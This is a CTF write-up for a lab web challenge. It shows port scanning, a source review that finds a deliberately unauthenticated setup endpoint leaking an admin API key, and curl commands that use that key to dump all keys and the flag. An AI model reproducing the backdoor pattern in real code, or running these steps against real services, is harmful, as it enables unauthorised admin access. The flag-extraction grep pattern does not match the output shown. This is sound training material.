# Gatekeeper – CTF Write-up

## Challenge Info

- **Name:** Gatekeeper  
- **Category:** Web  
- **Flag format:** `MCTF{...}`
- **Environment:** Isolated VPN network
- **Given:**
  - Two internal IPs (example from my instance):
    - `10.240.2.21`
    - `10.240.3.79`
  - Source archive with:
    - `control-api/` – Node.js backend
    - `front-end/` – Flask frontend

Goal: obtain the flag from a “secured” backend API.

---

## Recon

First, scan all ports on both hosts:

```bash
nmap -sV -p- 10.240.2.21 10.240.3.79
```

Result (simplified):

- `10.240.2.21:80` – `http` (Node.js / Express)
- `10.240.3.79` – no useful open HTTP service

Check what’s running on port 80 of the live host:

```bash
curl http://10.240.2.21/
```

Output:

```json
{"message":"Welcome to the Random Data API!","instructions":"Provide an API key in the "Authorization" header to access data."}
```

So `10.240.2.21` is the **Random Data API** / `control-api` backend.

---

## Source Review

From the provided source code:

### API Key Management

The Node.js backend keeps API keys in memory:

```js
const apiKeys = new Map();
```

On startup it creates three keys:

```js
apiKeys.set(mintApiKey('user', 1, 'Standard User'), {
    id: 1,
    role: 'user',
    name: 'Standard User'
});

apiKeys.set(mintApiKey('admin', 2, 'Administrator'), {
    id: 2,
    role: 'admin',
    name: 'Administrator'
});

apiKeys.set(mintApiKey('flag', 3, env.FLAG_NAME || 'MCTF25{t35t_fl4g}'), {
    id: 3,
    role: 'admin',
    name: env.FLAG_NAME || 'MCTF25{t35t_fl4g}'
});
```

Key observations:

- There is a **special admin key** (`id = 3`) whose **`name` is the flag**.
- Authentication is done with a `Bearer` token:
  ```http
  Authorization: Bearer <apiKey>
  ```

### Interesting Endpoints

Relevant routes:

```text
GET  /               # public
POST /api/identify   # requires any valid key (user or admin)
GET  /api/admin/keys # requires admin key
GET  /api/setup      # NO AUTH (one-time setup)
```

Admin keys listing:

```js
app.get('/api/admin/keys', apiKeyAuth, requireAdmin, (req, res) => {
    const keysList = Array.from(apiKeys.entries()).map(([key, details]) => ({
        apiKey: key,
        ...details
    }));
    res.json({
        message: 'List of all registered API keys.',
        keys: keysList
    });
});
```

This endpoint dumps all API keys and their metadata (including the flag account).

The suspicious part is `/api/setup`:

```js
let admin_key_queried = false;

app.get('/api/setup', (req, res) => {
    if (admin_key_queried) {
        return res.status(403).json({ error: 'You snooze, you lose.' });
    }
    admin_key_queried = true;
    res.json({
        message: 'Setup complete. Admin key has been queried.',
        adminKey: Array.from(apiKeys.entries())
          .find(([key, details]) => details.role === 'admin')[0]
    });
});
```

This is effectively a **backdoor**:

- No authentication.
- Returns a valid **admin API key** on first use.
- After that, it returns a 403 with `"You snooze, you lose."`.

### Frontend Behavior

The Flask frontend, on startup, does:

```python
resp = requests.get(f'{CONTROL_API_URL}/setup')
API_KEY = resp.json().get('adminKey')
```

Then it uses this admin key server-side to call `/api/identify`. It never exposes the admin key to users, but it does consume `/api/setup` once at startup.

On some instances, if the frontend hits `/api/setup` before you, you’ll see the “You snooze, you lose” error and need to reset the challenge.

---

## Vulnerability

**Type:** Insecure, unauthenticated “setup” endpoint → trivial privilege escalation.

- `/api/setup` is publicly reachable and unauthenticated.
- On the first request, it hands out an **admin API key**.
- Using that key, we can access `/api/admin/keys`.
- `/api/admin/keys` lists all keys and their metadata, including the **flag** (stored as the `name` of the special flag key).

We do **not** need to break PBKDF2, bypass the frontend, or exploit file uploads; just talk directly to the backend.

---

## Exploit

Assume the control API is at `10.240.2.21`.

### 1. Grab the Admin Key via `/api/setup`

Call `/api/setup` once and save the result:

```bash
curl -s http://10.240.2.21/api/setup -o setup.json
cat setup.json
```

Example output:

```json
{"message":"Setup complete. Admin key has been queried.","adminKey":"3aada98098d30d2a70d3d5eab640b949"}
```

Set the admin key:

```bash
ADMIN_KEY="3aada98098d30d2a70d3d5eab640b949"
echo "$ADMIN_KEY"
```

> If you instead get:
> ```json
> {"error":"You snooze, you lose."}
> ```
> then `/api/setup` has already been used (e.g. by the frontend).  
> In that case, reset / restart the challenge instance and retry.

---

### 2. List All Keys Using the Admin Key

Use the obtained admin key to call the admin endpoint:

```bash
curl -s -H "Authorization: Bearer $ADMIN_KEY"   http://10.240.2.21/api/admin/keys | tee keys.json
```

Example structure:

```json
{
  "message": "List of all registered API keys.",
  "keys": [
    {
      "apiKey": "....",
      "id": 1,
      "role": "user",
      "name": "Standard User"
    },
    {
      "apiKey": "....",
      "id": 2,
      "role": "admin",
      "name": "Administrator"
    },
    {
      "apiKey": "....",
      "id": 3,
      "role": "admin",
      "name": "MCTF25{th15_5hift5_3v3rYth1ng}"
    }
  ]
}
```

To extract just the flag:

```bash
grep -o 'MCTF{[^"]*}' keys.json
```

Output:

```text
MCTF25{th15_5hift5_3v3rYth1ng}
